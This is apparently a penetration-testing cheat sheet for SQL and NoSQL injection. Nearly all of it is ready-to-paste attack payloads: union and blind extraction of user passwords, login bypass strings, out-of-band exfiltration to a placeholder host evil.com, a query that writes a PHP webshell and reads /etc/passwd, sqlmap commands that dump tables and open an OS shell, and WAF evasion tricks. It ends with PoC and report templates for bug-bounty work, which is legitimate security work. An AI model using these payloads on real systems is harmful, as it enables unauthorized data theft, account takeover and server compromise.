# SQLi - SQL Injection

## What Is It
Inject SQL code into queries → read/modify database, bypass auth, RCE.

## Features / Where to Find
- Login forms (username/password)
- Search boxes
- URL parameters: `?id=1`, `?category=phones`
- ORDER BY, sort parameters
- Filter/category parameters
- REST API endpoints with IDs
- Cookie values used in queries
- HTTP headers (User-Agent, X-Forwarded-For, Referer)
- JSON body parameters

---

## Actions / Attack Techniques

### Detection Payloads
```sql
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
' OR 1=1#
1' AND '1'='1
1 AND 1=2
1; SELECT SLEEP(5)--
' WAITFOR DELAY '0:0:5'--
```

### Error-Based SQLi
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND updatexml(1,concat(0x7e,version()),1)--
```

### Union-Based SQLi
```sql
# Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error here means 2 columns

# Find visible columns
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2--
' UNION SELECT 'a','b'--

# Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Boolean-Based Blind SQLi
```sql
# True condition
' AND 1=1--    → normal response
# False condition
' AND 1=2--    → different/empty response

# Extract data char by char
' AND SUBSTRING(version(),1,1)='5'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

### Time-Based Blind SQLi
```sql
# MySQL
' AND SLEEP(5)--
' OR SLEEP(5)--
'; SELECT SLEEP(5)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
' IF 1=1 WAITFOR DELAY '0:0:5'--

# PostgreSQL
'; SELECT pg_sleep(5)--
' OR 1=1; SELECT pg_sleep(5)--

# Oracle
' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NOT NULL--
```

### Out-of-Band SQLi
```sql
# MySQL - DNS exfiltration
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.evil.com\\share'))--

# MSSQL
'; EXEC master..xp_dirtree '//evil.com/share'--

# Oracle
' UNION SELECT UTL_HTTP.REQUEST('http://evil.com/'||version) FROM dual--
```

### Authentication Bypass
```sql
# Login form bypass
admin'--
admin'#
' OR 1=1--
' OR '1'='1'--
admin' OR '1'='1
' OR 1=1 LIMIT 1--
') OR ('1'='1
```

### SQLi → RCE (MySQL)
```sql
# Write webshell (needs FILE privilege)
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--

# Read files
' UNION SELECT LOAD_FILE('/etc/passwd')--
```

### NoSQL Injection (MongoDB)
```json
# Login bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrong"}}
{"username": {"$regex": "admin"}, "password": {"$ne": null}}

# In URL
?username[$ne]=invalid&password[$ne]=invalid
?username[$gt]=&password[$gt]=
```

---

## sqlmap Cheatsheet
```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1"

# Detect and dump databases
sqlmap -u "https://target.com/page?id=1" --dbs

# Dump specific database
sqlmap -u "https://target.com/page?id=1" -D dbname --tables

# Dump specific table
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump

# POST request
sqlmap -u "https://target.com/login" --data="user=admin&pass=test"

# Cookie injection
sqlmap -u "https://target.com/" --cookie="session=VALUE"

# From Burp request file
sqlmap -r request.txt --level=3 --risk=2

# Bypass WAF
sqlmap -u "https://target.com/?id=1" --tamper=space2comment,between,randomcase

# Blind SQLi with time
sqlmap -u "https://target.com/?id=1" --technique=T --time-sec=5

# Get shell
sqlmap -u "https://target.com/?id=1" --os-shell
```

---

## WAF Bypass Techniques
```sql
# Space bypass
/**/SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users
SELECT(username)FROM(users)

# Case variation
SeLeCt UsErNaMe FrOm UsErS

# Comments
SE/**/LECT user/**/name FR/**/OM us/**/ers

# Encoding
%53%45%4c%45%43%54  (URL encoded SELECT)
0x53454c454354       (Hex)

# Scientific notation (MySQL)
1e0 UNION SELECT...

# Inline comments
/*!SELECT*/ username /*!FROM*/ users
```

---

## PoC Template
```
URL: https://target.com/product?id=1

Test 1 - Error:
id=1'
Response: MySQL error: You have an error in your SQL syntax...

Test 2 - Time-based:
id=1' AND SLEEP(5)--
Response: 5 second delay confirmed

Test 3 - Extract:
sqlmap -u "https://target.com/product?id=1" --dbs --batch
Output: Database: target_db, Tables: users, orders, payments

Test 4 - Dump users:
sqlmap -u "..." -D target_db -T users --dump
Output: admin:hash, users:hashes
```

## Report Template
**Title:** SQL Injection in [parameter] allows full database access
**Severity:** Critical
**Impact:** Full database dump, authentication bypass, potential RCE
